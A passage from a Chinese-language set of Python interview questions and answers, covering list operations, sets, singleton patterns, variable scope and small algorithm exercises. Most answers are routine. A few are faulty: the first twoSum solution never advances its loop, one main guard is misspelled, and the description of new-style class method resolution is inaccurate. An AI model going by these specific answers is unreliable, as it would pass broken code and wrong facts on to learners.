4\u56de\u4e00\u4e2a\u7a7a\u5217\u8868\u3002\u8fd9\u6210\u4e3a\u7279\u522b\u8ba9\u4eba\u6076\u5fc3\u7684\u7591\u96be\u6742\u75c7\uff0c\u56e0\u4e3a\u8fd0\u884c\u7684\u65f6\u5019\u6ca1\u6709\u9519\u8bef\u4ea7\u751f\uff0c\u5bfc\u81f4Bug\u5f88\u96be\u88ab\u8ffd\u8e2a\u5230\u3002\n### 11.\u5199\u4e00\u4e2a\u5217\u8868\u751f\u6210\u5f0f\uff0c\u4ea7\u751f\u4e00\u4e2a\u516c\u5dee\u4e3a11\u7684\u7b49\u5dee\u6570\u5217\n```python\nprint([x*11 for x in range(10)])\n```\n### 12.\u7ed9\u5b9a\u4e24\u4e2a\u5217\u8868\uff0c\u600e\u4e48\u627e\u51fa\u4ed6\u4eec\u76f8\u540c\u7684\u5143\u7d20\u548c\u4e0d\u540c\u7684\u5143\u7d20\uff1f\n```python\nlist1 = [1,2,3]\nlist2 = [3,4,5]\nset1 = set(list1)\nset2 = set(list2)\nprint(set1 & set2)\nprint(set1 ^ set2)\n```\n### 13.\u8bf7\u5199\u51fa\u4e00\u6bb5python\u4ee3\u7801\u5b9e\u73b0\u5220\u9664list\u91cc\u9762\u7684\u91cd\u590d\u5143\u7d20\uff1f\n```python\nl1 = ['b','c','d','c','a','a']\nl2 = list(set(l1))\nprint(l2)\n```\n\u7528list\u7c7b\u7684sort\u65b9\u6cd5:\n```python\nl1 = ['b','c','d','c','a','a']\nl2 = list(set(l1))\nl2.sort(key=l1.index)\nprint(l2)\n```\n\u4e5f\u53ef\u4ee5\u8fd9\u6837\u5199:\n```python\nl1 = ['b','c','d','c','a','a']\nl2 = sorted(set(l1),key=l1.index)\nprint(l2)\n```\n\u4e5f\u53ef\u4ee5\u7528\u904d\u5386\uff1a\n```python\nl1 = ['b','c','d','c','a','a']\nl2 = []\nfor i in l1:\n    if not i in l2:\n        l2.append(i)\nprint(l2)\n```\n### 14.\u7ed9\u5b9a\u4e24\u4e2alist A\uff0cB ,\u8bf7\u7528\u627e\u51faA\uff0cB\u4e2d\u76f8\u540c\u4e0e\u4e0d\u540c\u7684\u5143\u7d20\n```python\nA,B \u4e2d\u76f8\u540c\u5143\u7d20\uff1a print(set(A)&set(B))\nA,B \u4e2d\u4e0d\u540c\u5143\u7d20:  print(set(A)^set(B))\n```\n## \u4f01\u4e1a\u9762\u8bd5\u9898\n### 15.python\u65b0\u5f0f\u7c7b\u548c\u7ecf\u5178\u7c7b\u7684\u533a\u522b\uff1f\na. \u5728python\u91cc\u51e1\u662f\u7ee7\u627f\u4e86object\u7684\u7c7b\uff0c\u90fd\u662f\u65b0\u5f0f\u7c7b\n\nb. Python3\u91cc\u53ea\u6709\u65b0\u5f0f\u7c7b\n\nc. Python2\u91cc\u9762\u7ee7\u627fobject\u7684\u662f\u65b0\u5f0f\u7c7b\uff0c\u6ca1\u6709\u5199\u7236\u7c7b\u7684\u662f\u7ecf\u5178\u7c7b\n\nd. \u7ecf\u5178\u7c7b\u76ee\u524d\u5728Python\u91cc\u57fa\u672c\u6ca1\u6709\u5e94\u7528\n\ne. \u4fdd\u6301class\u4e0etype\u7684\u7edf\u4e00\u5bf9\u65b0\u5f0f\u7c7b\u7684\u5b9e\u4f8b\u6267\u884ca.__class__\u4e0etype(a)\u7684\u7ed3\u679c\u662f\u4e00\u81f4\u7684\uff0c\u5bf9\u4e8e\u65e7\u5f0f\u7c7b\u6765\u8bf4\u5c31\u4e0d\u4e00\u6837\u4e86\u3002\n\nf.\u5bf9\u4e8e\u591a\u91cd\u7ee7\u627f\u7684\u5c5e\u6027\u641c\u7d22\u987a\u5e8f\u4e0d\u4e00\u6837\u65b0\u5f0f\u7c7b\u662f\u91c7\u7528\u5e7f\u5ea6\u4f18\u5148\u641c\u7d22\uff0c\u65e7\u5f0f\u7c7b\u91c7\u7528\u6df1\u5ea6\u4f18\u5148\u641c\u7d22\u3002\n\n### 16.python\u4e2d\u5185\u7f6e\u7684\u6570\u636e\u7ed3\u6784\u6709\u51e0\u79cd\uff1f\na. \u6574\u578b int\u3001 \u957f\u6574\u578b long\u3001\u6d6e\u70b9\u578b float\u3001 \u590d\u6570 complex\n\nb. \u5b57\u7b26\u4e32 str\u3001 \u5217\u8868 list\u3001 \u5143\u7956 tuple\n\nc. \u5b57\u5178 dict \u3001 \u96c6\u5408 set\n\nd. Python3 \u4e2d\u6ca1\u6709 long\uff0c\u53ea\u6709\u65e0\u9650\u7cbe\u5ea6\u7684 int\n\n### 17.python\u5982\u4f55\u5b9e\u73b0\u5355\u4f8b\u6a21\u5f0f?\u8bf7\u5199\u51fa\u4e24\u79cd\u5b9e\u73b0\u65b9\u5f0f?\n\u7b2c\u4e00\u79cd\u65b9\u6cd5:\u4f7f\u7528\u88c5\u9970\u5668\n```python\ndef singleton(cls):\n    instances = {}\n    def wrapper(*args, **kwargs):\n        if cls not in instances:\n            instances[cls] = cls(*args, **kwargs)\n        return instances[cls]\n    return wrapper\n    \n    \n@singleton\nclass Foo(object):\n    pass\nfoo1 = Foo()\nfoo2 = Foo()\nprint(foo1 is foo2)  # True\n```\n\u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff1a\u4f7f\u7528\u57fa\u7c7b\nNew \u662f\u771f\u6b63\u521b\u5efa\u5b9e\u4f8b\u5bf9\u8c61\u7684\u65b9\u6cd5\uff0c\u6240\u4ee5\u91cd\u5199\u57fa\u7c7b\u7684new \u65b9\u6cd5\uff0c\u4ee5\u6b64\u4fdd\u8bc1\u521b\u5efa\u5bf9\u8c61\u7684\u65f6\u5019\u53ea\u751f\u6210\u4e00\u4e2a\u5b9e\u4f8b\n```python\nclass Singleton(object):\n    def __new__(cls, *args, **kwargs):\n        if not hasattr(cls, '_instance'):\n            cls._instance = super(Singleton, cls).__new__(cls, *args, **kwargs)\n        return cls._instance\n    \n    \nclass Foo(Singleton):\n    pass\n\nfoo1 = Foo()\nfoo2 = Foo()\n\nprint(foo1 is foo2)  # True\n```\n\u7b2c\u4e09\u79cd\u65b9\u6cd5\uff1a\u5143\u7c7b\uff0c\u5143\u7c7b\u662f\u7528\u4e8e\u521b\u5efa\u7c7b\u5bf9\u8c61\u7684\u7c7b\uff0c\u7c7b\u5bf9\u8c61\u521b\u5efa\u5b9e\u4f8b\u5bf9\u8c61\u65f6\u4e00\u5b9a\u8981\u8c03\u7528call\u65b9\u6cd5\uff0c\u56e0\u6b64\u5728\u8c03\u7528call\u65f6\u5019\u4fdd\u8bc1\u59cb\u7ec8\u53ea\u521b\u5efa\u4e00\u4e2a\u5b9e\u4f8b\u5373\u53ef\uff0ctype\u662fpython\u7684\u5143\u7c7b\n```python\nclass Singleton(type):\n    def __call__(cls, *args, **kwargs):\n        if not hasattr(cls, '_instance'):\n            cls._instance = super(Singleton, cls).__call__(*args, **kwargs)\n        return cls._instance\n\n\n# Python2\nclass Foo(object):\n    __metaclass__ = Singleton\n\n# Python3\nclass Foo(metaclass=Singleton):\n    pass\n\nfoo1 = Foo()\nfoo2 = Foo()\nprint(foo1 is foo2)  # True\n\n```\n### 18.\u53cd\u8f6c\u4e00\u4e2a\u6574\u6570\uff0c\u4f8b\u5982-123 --> -321 \n```python\nclass Solution(object):\n    def reverse(self,x):\n        if -10<x<10:\n            return x\n        str_x = str(x)\n        if str_x[0] !=\"-\":\n            str_x = str_x[::-1]\n            x = int(str_x)\n        else:\n            str_x = str_x[1:][::-1]\n            x = int(str_x)\n            x = -x\n        return x if -2147483648<x<2147483647 else 0\nif __name__ == '__main__':\n    s = Solution()\n    reverse_int = s.reverse(-120)\n    print(reverse_int)\n```\n### 19.\u8bbe\u8ba1\u5b9e\u73b0\u904d\u5386\u76ee\u5f55\u4e0e\u5b50\u76ee\u5f55\uff0c\u6293\u53d6.pyc\u6587\u4ef6\n\u7b2c\u4e00\u79cd\u65b9\u6cd5\uff1a\n```python\nimport os\n\ndef get_files(dir,suffix):\n    res = []\n    for root,dirs,files in os.walk(dir):\n        for filename in files:\n            name,suf = os.path.splitext(filename)\n            if suf == suffix:\n                res.append(os.path.join(root,filename))\n\n    print(res)\n\nget_files(\".\/\",'.pyc')\n```\n\u7b2c\u4e8c\u79cd\u65b9\u6cd5\uff1a\n```python\nimport os\n\ndef pick(obj):\n    if obj.endswith(\".pyc\"):\n        print(obj)\n    \ndef scan_path(ph):\n    file_list = os.listdir(ph)\n    for obj in file_list:\n        if os.path.isfile(obj):\n            pick(obj)\n        elif os.path.isdir(obj):\n            scan_path(obj)\n    \nif __name__=='__main__':\n    path = input('\u8f93\u5165\u76ee\u5f55')\n    scan_path(path)\n```\n\u7b2c\u4e09\u79cd\u65b9\u6cd5\n```python\nfrom glob import iglob\n\n\ndef func(fp, postfix):\n    for i in iglob(f\"{fp}\/**\/*{postfix}\", recursive=True):\n        print(i)\n\nif __name__ == \"__main__\":\n    postfix = \".pyc\"\n    func(\"K:\\Python_script\", postfix)\n```\n### 20.\u4e00\u884c\u4ee3\u7801\u5b9e\u73b01-100\u4e4b\u548c\n```python\ncount = sum(range(0,101))\nprint(count)\n```\n### 21.Python-\u904d\u5386\u5217\u8868\u65f6\u5220\u9664\u5143\u7d20\u7684\u6b63\u786e\u505a\u6cd5\n\u904d\u5386\u5728\u65b0\u5728\u5217\u8868\u64cd\u4f5c\uff0c\u5220\u9664\u65f6\u5728\u539f\u6765\u7684\u5217\u8868\u64cd\u4f5c\n```python\na = [1,2,3,4,5,6,7,8]\nprint(id(a))\nprint(id(a[:]))\nfor i in a[:]:\n    if i>5:\n        pass\n    else:\n        a.remove(i)\n    print(a)\nprint('-----------')\nprint(id(a))\n\n```\n```python\n#filter\na=[1,2,3,4,5,6,7,8]\nb = filter(lambda x: x>5,a)\nprint(list(b))\n```\n\u5217\u8868\u89e3\u6790\n```python\na=[1,2,3,4,5,6,7,8]\nb = [i for i in a if i>5]\nprint(b)\n```\n\u5012\u5e8f\u5220\u9664\n\u56e0\u4e3a\u5217\u8868\u603b\u662f\u2018\u5411\u524d\u79fb\u2019\uff0c\u6240\u4ee5\u53ef\u4ee5\u5012\u5e8f\u904d\u5386\uff0c\u5373\u4f7f\u540e\u9762\u7684\u5143\u7d20\u88ab\u4fee\u6539\u4e86\uff0c\u8fd8\u6ca1\u6709\u88ab\u904d\u5386\u7684\u5143\u7d20\u548c\u5176\u5750\u6807\u8fd8\u662f\u4fdd\u6301\u4e0d\u53d8\u7684\n```python\na=[1,2,3,4,5,6,7,8]\nprint(id(a))\nfor i in range(len(a)-1,-1,-1):\n    if a[i]>5:\n        pass\n    else:\n        a.remove(a[i])\nprint(id(a))\nprint('-----------')\nprint(a)\n```\n### 22.\u5b57\u7b26\u4e32\u7684\u64cd\u4f5c\u9898\u76ee\n\u5168\u5b57\u6bcd\u77ed\u53e5 PANGRAM \u662f\u5305\u542b\u6240\u6709\u82f1\u6587\u5b57\u6bcd\u7684\u53e5\u5b50\uff0c\u6bd4\u5982\uff1aA QUICK BROWN FOX JUMPS OVER THE LAZY DOG. \u5b9a\u4e49\u5e76\u5b9e\u73b0\u4e00\u4e2a\u65b9\u6cd5 get_missing_letter, \u4f20\u5165\u4e00\u4e2a\u5b57\u7b26\u4e32\u91c7\u7eb3\u6570\uff0c\u8fd4\u56de\u53c2\u6570\u5b57\u7b26\u4e32\u53d8\u6210\u4e00\u4e2a PANGRAM \u4e2d\u6240\u7f3a\u5931\u7684\u5b57\u7b26\u3002\u5e94\u8be5\u5ffd\u7565\u4f20\u5165\u5b57\u7b26\u4e32\u53c2\u6570\u4e2d\u7684\u5927\u5c0f\u5199\uff0c\u8fd4\u56de\u5e94\u8be5\u90fd\u662f\u5c0f\u5199\u5b57\u7b26\u5e76\u6309\u5b57\u6bcd\u987a\u5e8f\u6392\u5e8f\uff08\u8bf7\u5ffd\u7565\u6240\u6709\u975e ACSII \u5b57\u7b26\uff09\n\n**\u4e0b\u9762\u793a\u4f8b\u662f\u7528\u6765\u89e3\u91ca\uff0c\u53cc\u5f15\u53f7\u4e0d\u9700\u8981\u8003\u8651:**\n\n(0)\u8f93\u5165: \"A quick brown for jumps over the lazy dog\"\n\n\u8fd4\u56de\uff1a \"\"\n\n(1)\u8f93\u5165: \"A slow yellow fox crawls under the proactive dog\" \n\n\u8fd4\u56de: \"bjkmqz\"\n\n(2)\u8f93\u5165: \"Lions, and tigers, and bears, oh my!\"\n\n\u8fd4\u56de: \"cfjkpquvwxz\" \n\n(3)\u8f93\u5165: \"\"\n\n\u8fd4\u56de\uff1a\"abcdefghijklmnopqrstuvwxyz\"\n\n```python\ndef get_missing_letter(a):\n    s1 = set(\"abcdefghijklmnopqrstuvwxyz\")\n    s2 = set(a.lower())\n    ret = \"\".join(sorted(s1-s2))\n    return ret\n    \nprint(get_missing_letter(\"python\"))\n\n# other ways to generate letters\n# range(\"a\", \"z\")\n# \u65b9\u6cd5\u4e00:\nimport string\nletters = string.ascii_lowercase\n# \u65b9\u6cd5\u4e8c:\nletters = \"\".join(map(chr, range(ord('a'), ord('z') + 1)))\n```\n\n### 23.\u53ef\u53d8\u7c7b\u578b\u548c\u4e0d\u53ef\u53d8\u7c7b\u578b\n1,\u53ef\u53d8\u7c7b\u578b\u6709list,dict.\u4e0d\u53ef\u53d8\u7c7b\u578b\u6709string\uff0cnumber,tuple.\n\n2,\u5f53\u8fdb\u884c\u4fee\u6539\u64cd\u4f5c\u65f6\uff0c\u53ef\u53d8\u7c7b\u578b\u4f20\u9012\u7684\u662f\u5185\u5b58\u4e2d\u7684\u5730\u5740\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u76f4\u63a5\u4fee\u6539\u5185\u5b58\u4e2d\u7684\u503c\uff0c\u5e76\u6ca1\u6709\u5f00\u8f9f\u65b0\u7684\u5185\u5b58\u3002\n\n3,\u4e0d\u53ef\u53d8\u7c7b\u578b\u88ab\u6539\u53d8\u65f6\uff0c\u5e76\u6ca1\u6709\u6539\u53d8\u539f\u5185\u5b58\u5730\u5740\u4e2d\u7684\u503c\uff0c\u800c\u662f\u5f00\u8f9f\u4e00\u5757\u65b0\u7684\u5185\u5b58\uff0c\u5c06\u539f\u5730\u5740\u4e2d\u7684\u503c\u590d\u5236\u8fc7\u53bb\uff0c\u5bf9\u8fd9\u5757\u65b0\u5f00\u8f9f\u7684\u5185\u5b58\u4e2d\u7684\u503c\u8fdb\u884c\u64cd\u4f5c\u3002\n\n### 24.is\u548c==\u6709\u4ec0\u4e48\u533a\u522b\uff1f\nis\uff1a\u6bd4\u8f83\u7684\u662f\u4e24\u4e2a\u5bf9\u8c61\u7684id\u503c\u662f\u5426\u76f8\u7b49\uff0c\u4e5f\u5c31\u662f\u6bd4\u8f83\u4fe9\u5bf9\u8c61\u662f\u5426\u4e3a\u540c\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u3002\u662f\u5426\u6307\u5411\u540c\u4e00\u4e2a\u5185\u5b58\u5730\u5740\n\n== \uff1a \u6bd4\u8f83\u7684\u4e24\u4e2a\u5bf9\u8c61\u7684\u5185\u5bb9\/\u503c\u662f\u5426\u76f8\u7b49\uff0c\u9ed8\u8ba4\u4f1a\u8c03\u7528\u5bf9\u8c61\u7684eq()\u65b9\u6cd5\n### 25.\u6c42\u51fa\u5217\u8868\u6240\u6709\u5947\u6570\u5e76\u6784\u9020\u65b0\u5217\u8868\n```python\na = [1,2,3,4,5,6,7,8,9,10]\nres = [ i for i in a if i%2==1]\nprint(res)\n```\n### 26.\u7528\u4e00\u884cpython\u4ee3\u7801\u5199\u51fa1+2+3+10248\n```python\nfrom functools import reduce\n#1.\u4f7f\u7528sum\u5185\u7f6e\u6c42\u548c\u51fd\u6570\nnum = sum([1,2,3,10248])\nprint(num)\n#2.reduce \u51fd\u6570\nnum1 = reduce(lambda x,y :x+y,[1,2,3,10248])\nprint(num1)\n```\n### 27.Python\u4e2d\u53d8\u91cf\u7684\u4f5c\u7528\u57df\uff1f\uff08\u53d8\u91cf\u67e5\u627e\u987a\u5e8f)\n\u51fd\u6570\u4f5c\u7528\u57df\u7684LEGB\u987a\u5e8f\n\n1.\u4ec0\u4e48\u662fLEGB?\n\nL\uff1a local \u51fd\u6570\u5185\u90e8\u4f5c\u7528\u57df\n\nE: enclosing \u51fd\u6570\u5185\u90e8\u4e0e\u5185\u5d4c\u51fd\u6570\u4e4b\u95f4\n\nG: global \u5168\u5c40\u4f5c\u7528\u57df\n\nB\uff1a build-in \u5185\u7f6e\u4f5c\u7528\n\npython\u5728\u51fd\u6570\u91cc\u9762\u7684\u67e5\u627e\u5206\u4e3a4\u79cd\uff0c\u79f0\u4e4b\u4e3aLEGB\uff0c\u4e5f\u6b63\u662f\u6309\u7167\u8fd9\u662f\u987a\u5e8f\u6765\u67e5\u627e\u7684\n### 28.\u5b57\u7b26\u4e32 `\"123\"` \u8f6c\u6362\u6210 `123`\uff0c\u4e0d\u4f7f\u7528\u5185\u7f6eapi\uff0c\u4f8b\u5982 `int()`\n\u65b9\u6cd5\u4e00\uff1a \u5229\u7528 `str` \u51fd\u6570\n```python\ndef atoi(s):\n    num = 0\n    for v in s:\n        for j in range(10):\n            if v == str(j):\n                num = num * 10 + j\n    return num\n```\n\u65b9\u6cd5\u4e8c\uff1a \u5229\u7528 `ord` \u51fd\u6570\n```python\ndef atoi(s):\n    num = 0\n    for v in s:\n        num = num * 10 + ord(v) - ord('0')\n    return num\n```\n\u65b9\u6cd5\u4e09: \u5229\u7528 `eval` \u51fd\u6570\n```python\ndef atoi(s):\n    num = 0\n    for v in s:\n        t = \"%s * 1\" % v\n        n = eval(t)\n        num = num * 10 + n\n    return num\n```\n\u65b9\u6cd5\u56db: \u7ed3\u5408\u65b9\u6cd5\u4e8c\uff0c\u4f7f\u7528 `reduce`\uff0c\u4e00\u884c\u89e3\u51b3\n```python\nfrom functools import reduce\ndef atoi(s):\n    return reduce(lambda num, v: num * 10 + ord(v) - ord('0'), s, 0)\n```\n### 29.Given an array of integers\n\u7ed9\u5b9a\u4e00\u4e2a\u6574\u6570\u6570\u7ec4\u548c\u4e00\u4e2a\u76ee\u6807\u503c\uff0c\u627e\u51fa\u6570\u7ec4\u4e2d\u548c\u4e3a\u76ee\u6807\u503c\u7684\u4e24\u4e2a\u6570\u3002\u4f60\u53ef\u4ee5\u5047\u8bbe\u6bcf\u4e2a\u8f93\u5165\u53ea\u5bf9\u5e94\u4e00\u79cd\u7b54\u6848\uff0c\u4e14\u540c\u6837\u7684\u5143\u7d20\u4e0d\u80fd\u88ab\u91cd\u590d\u5229\u7528\u3002\u793a\u4f8b:\u7ed9\u5b9anums = [2,7,11,15],target=9 \u56e0\u4e3a nums[0]+nums[1] = 2+7 =9,\u6240\u4ee5\u8fd4\u56de[0,1]\n```python\nclass Solution:\n    def twoSum(self,nums,target):\n        \"\"\"\n        :type nums: List[int]\n        :type target: int\n        :rtype: List[int]\n        \"\"\"\n        d = {}\n        size = 0\n        while size < len(nums):\n            if target-nums[size] in d:\n                if d[target-nums[size]] <size:\n                    return [d[target-nums[size]],size]\n                else:\n                    d[nums[size]] = size\n                size = size +1\nsolution = Solution()\nlist = [2,7,11,15]\ntarget = 9\nnums = solution.twoSum(list,target)\nprint(nums)\n```\n\n```\n\nclass Solution(object):\n    def twoSum(self, nums, target):\n        for i in range(len(nums)):\n            num = target - nums[i]\n            if num in nums[i+1:]:\n                return [i, nums.index(num,i+1)]\n\n```\n\u7ed9\u5217\u8868\u4e2d\u7684\u5b57\u5178\u6392\u5e8f\uff1a\u5047\u8bbe\u6709\u5982\u4e0blist\u5bf9\u8c61\uff0calist=[{\"name\":\"a\",\"age\":20},{\"name\":\"b\",\"age\":30},{\"name\":\"c\",\"age\":25}],\u5c06alist\u4e2d\u7684\u5143\u7d20\u6309\u7167age\u4ece\u5927\u5230\u5c0f\u6392\u5e8f alist=[{\"name\":\"a\",\"age\":20},{\"name\":\"b\",\"age\":30},{\"name\":\"c\",\"age\":25}]\n```python\nalist_sort = sorted(alist,key=lambda e: e.__getitem__('age'),reverse=True)\n```\n\n### 30.python\u4ee3\u7801\u5b9e\u73b0\u5220\u9664\u4e00\u4e2alist\u91cc\u9762\u7684\u91cd\u590d\u5143\u7d20\n```python\ndef distFunc1(a):\n    \"\"\"\u4f7f\u7528\u96c6\u5408\u53bb\u91cd\"\"\"\n    a = list(set(a))\n    print(a)\n\ndef distFunc2(a):\n    \"\"\"\u5c06\u4e00\u4e2a\u5217\u8868\u7684\u6570\u636e\u53d6\u51fa\u653e\u5230\u53e6\u4e00\u4e2a\u5217\u8868\u4e2d\uff0c\u4e2d\u95f4\u4f5c\u5224\u65ad\"\"\"\n    list = []\n    for i in a:\n        if i not in list:\n            list.append(i)\n    #\u5982\u679c\u9700\u8981\u6392\u5e8f\u7684\u8bdd\u7528sort\n    list.sort()\n    print(list)\n\ndef distFunc3(a):\n    \"\"\"\u4f7f\u7528\u5b57\u5178\"\"\"\n    b = {}\n    b = b.fromkeys(a)\n    c = list(b.keys())\n    print(c)\n\nif __name__ == \"__main__\":\n    a = [1,2,4,2,4,5,7,10,5,5,7,8,9,0,3]\n    distFunc1(a)\n    distFunc2(a)\n    distFunc3(a)\n  \n```\n### 31.\u7edf\u8ba1\u4e00\u4e2a\u6587\u672c\u4e2d\u5355\u8bcd\u9891\u6b21\u6700\u9ad8\u768410\u4e2a\u5355\u8bcd\uff1f\n```python\nimport re\n\n# \u65b9\u6cd5\u4e00\ndef test(filepath):\n    \n    distone = {}\n\n    with open(filepath) as f:\n        for line in f:\n            line = re.sub(\"\\W+\", \" \", line)\n            lineone = line.split()\n            for keyone in lineone:\n                if not distone.get(keyone):\n                    distone[keyone] = 1\n                else:\n                    distone[keyone] += 1\n    num_ten = sorted(distone.items(), key=lambda x:x[1], reverse=True)[:10]\n    num_ten =[x[0] for x in num_ten]\n    return num_ten\n    \n \n# \u65b9\u6cd5\u4e8c \n# \u4f7f\u7528 built-in \u7684 Counter \u91cc\u9762\u7684 most_common\nimport re\nfrom collections import Counter\n\n\ndef test2(filepath):\n    with open(filepath) as f:\n        return list(map(lambda c: c[0], Counter(re.sub(\"\\W+\", \" \", f.read()).split()).most_common(10)))\n```\n### 32.\u8bf7\u5199\u51fa\u4e00\u4e2a\u51fd\u6570\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\n\u8be5\u51fd\u6570\u7684\u8f93\u5165\u662f\u4e00\u4e2a\u4ec5\u5305\u542b\u6570\u5b57\u7684list,\u8f93\u51fa\u4e00\u4e2a\u65b0\u7684list\uff0c\u5176\u4e2d\u6bcf\u4e00\u4e2a\u5143\u7d20\u8981\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\uff1a\n\n1\u3001\u8be5\u5143\u7d20\u662f\u5076\u6570\n\n2\u3001\u8be5\u5143\u7d20\u5728\u539flist\u4e2d\u662f\u5728\u5076\u6570\u7684\u4f4d\u7f6e(index\u662f\u5076\u6570)\n\n```python\ndef num_list(num):\n    return [i for i in num if i %2 ==0 and num.index(i)%2==0]\n\nnum = [0,1,2,3,4,5,6,7,8,9,10]\nresult = num_list(num)\nprint(result)\n```\n### 33.\u4f7f\u7528\u5355\u4e00\u7684\u5217\u8868\u751f\u6210\u5f0f\u6765\u4ea7\u751f\u4e00\u4e2a\u65b0\u7684\u5217\u8868\n\u8be5\u5217\u8868\u53ea\u5305\u542b\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\u7684\u503c\uff0c\u5143\u7d20\u4e3a\u539f\u59cb\u5217\u8868\u4e2d\u5076\u6570\u5207\u7247\n```python\nlist_data = [1,2,5,8,10,3,18,6,20]\nres = [x for x in list_data[::2] if x %2 ==0]\nprint(res)\n```\n### 34.\u7528\u4e00\u884c\u4ee3\u7801\u751f\u6210[1,4,9,16,25,36,49,64,81,100]\n```python\n[x * x for x in range(1,11)]\n```\n### 35.\u8f93\u5165\u67d0\u5e74\u67d0\u6708\u67d0\u65e5\uff0c\u5224\u65ad\u8fd9\u4e00\u5929\u662f\u8fd9\u4e00\u5e74\u7684\u7b2c\u51e0\u5929\uff1f\n```python\nimport datetime\n\ny = int(input(\"\u8bf7\u8f93\u51654\u4f4d\u6570\u5b57\u7684\u5e74\u4efd:\"))\nm = int(input(\"\u8bf7\u8f93\u5165\u6708\u4efd:\"))\nd = int(input(\"\u8bf7\u8f93\u5165\u662f\u54ea\u4e00\u5929\"))\n\ntargetDay = datetime.date(y,m,d)\ndayCount = targetDay - datetime.date(targetDay.year -1,12,31)\nprint(\"%s\u662f %s\u5e74\u7684\u7b2c%s\u5929\u3002\"%(targetDay,y,dayCount.days))\n```\n### 36.\u4e24\u4e2a\u6709\u5e8f\u5217\u8868\uff0cl1,l2\uff0c\u5bf9\u8fd9\u4e24\u4e2a\u5217\u8868\u8fdb\u884c\u5408\u5e76\u4e0d\u53ef\u4f7f\u7528extend\n```python\ndef loop_merge_sort(l1,l2):\n    tmp = []\n    while len(l1)>0 and len(l2)>0:\n        if l1[0] <l2[0]:\n            tmp.append(l1[0])\n            del l1[0]\n        else:\n            tmp.append(l2[0])\n            del l2[0]\n    while len(l1)>0:\n        tmp.append(l1[0])\n        del l1[0]\n    while len(l2)>0:\n        tmp.append(l2[0])\n        del l2[0]\n    return tmp\n```\n### 37.\u7ed9\u5b9a\u4e00\u4e2a\u4efb\u610f\u957f\u5ea6\u6570\u7ec4\uff0c\u5b9e\u73b0\u4e00\u4e2a\u51fd\u6570\n\u8ba9\u6240\u6709\u5947\u6570\u90fd\u5728\u5076\u6570\u524d\u9762\uff0c\u800c\u4e14\u5947\u6570\u5347\u5e8f\u6392\u5217\uff0c\u5076\u6570\u964d\u5e8f\u6392\u5e8f\uff0c\u5982\u5b57\u7b26\u4e32'1982376455',\u53d8\u6210'1355798642'\n```python\n# \u65b9\u6cd5\u4e00\ndef func1(l):\n    if isinstance(l, str):\n        l = [int(i) for i in l]\n    l.sort(reverse=True)\n    for i in range(len(l)):\n        if l[i] % 2 > 0:\n            l.insert(0, l.pop(i))\n    print(''.join(str(e) for e in l))\n\n# \u65b9\u6cd5\u4e8c\ndef func2(l):\n    print(\"\".join(sorted(l, key=lambda x: int(x) % 2 == 0 and 20 - int(x) or int(x))))\n```\n### 38.\u5199\u4e00\u4e2a\u51fd\u6570\u627e\u51fa\u4e00\u4e2a\u6574\u6570\u6570\u7ec4\u4e2d\uff0c\u7b2c\u4e8c\u5927\u7684\u6570\n```python\ndef find_second_large_num(num_list):\n    \"\"\"\n    \u627e\u51fa\u6570\u7ec4\u7b2c2\u5927\u7684\u6570\u5b57\n    \"\"\"\n    # \u65b9\u6cd5\u4e00\n    # \u76f4\u63a5\u6392\u5e8f\uff0c\u8f93\u51fa\u5012\u6570\u7b2c\u4e8c\u4e2a\u6570\u5373\u53ef\n    tmp_list = sorted(num_list)\n    print(\"\u65b9\u6cd5\u4e00\\nSecond_large_num is :\", tmp_list[-2])\n    \n    # \u65b9\u6cd5\u4e8c\n    # \u8bbe\u7f6e\u4e24\u4e2a\u6807\u5fd7\u4f4d\u4e00\u4e2a\u5b58\u50a8\u6700\u5927\u6570\u4e00\u4e2a\u5b58\u50a8\u6b21\u5927\u6570\n    # two \u5b58\u50a8\u6b21\u5927\u503c\uff0cone \u5b58\u50a8\u6700\u5927\u503c\uff0c\u904d\u5386\u4e00\u6b21\u6570\u7ec4\u5373\u53ef\uff0c\u5148\u5224\u65ad\u662f\u5426\u5927\u4e8e one\uff0c\u82e5\u5927\u4e8e\u5c06 one \u7684\u503c\u7ed9 two\uff0c\u5c06 num_list[i] \u7684\u503c\u7ed9 one\uff0c\u5426\u5219\u6bd4\u8f83\u662f\u5426\u5927\u4e8etwo\uff0c\u82e5\u5927\u4e8e\u76f4\u63a5\u5c06 num_list[i] \u7684\u503c\u7ed9two\uff0c\u5426\u5219pass\n    one = num_list[0]\n    two = num_list[0]\n    for i in range(1, len(num_list)):\n        if num_list[i] > one:\n            two = one\n            one = num_list[i]\n        elif num_list[i] > two:\n            two = num_list[i]\n    print(\"\u65b9\u6cd5\u4e8c\\nSecond_large_num is :\", two)\n    \n    # \u65b9\u6cd5\u4e09\n    # \u7528 reduce \u4e0e\u903b\u8f91\u7b26\u53f7 (and, or)\n    # \u57fa\u672c\u601d\u8def\u4e0e\u65b9\u6cd5\u4e8c\u4e00\u6837\uff0c\u4f46\u662f\u4e0d\u9700\u8981\u7528 if \u8fdb\u884c\u5224\u65ad\u3002\n    from functools import reduce\n    num = reduce(lambda ot, x: ot[1] < x and (ot[1], x) or ot[0] < x and (x, ot[1]) or ot, num_list, (0, 0))[0]\n    print(\"\u65b9\u6cd5\u4e09\\nSecond_large_num is :\", num)\n    \n    \nif __name__ == '__main___':\n    num_list = [34, 11, 23, 56, 78, 0, 9, 12, 3, 7, 5]\n    find_second_large_num(num_list)\n```\n### 39.\u9605\u8bfb\u4e00\u4e0b\u4ee3\u7801\u4ed6\u4eec\u7684\u8f93\u51fa\u7ed3\u679c\u662f\u4ec0\u4e48\uff1f\n```python\ndef multi():\n    return [lambda x : i*x for i in range(4)]\nprint([m(3) for m in 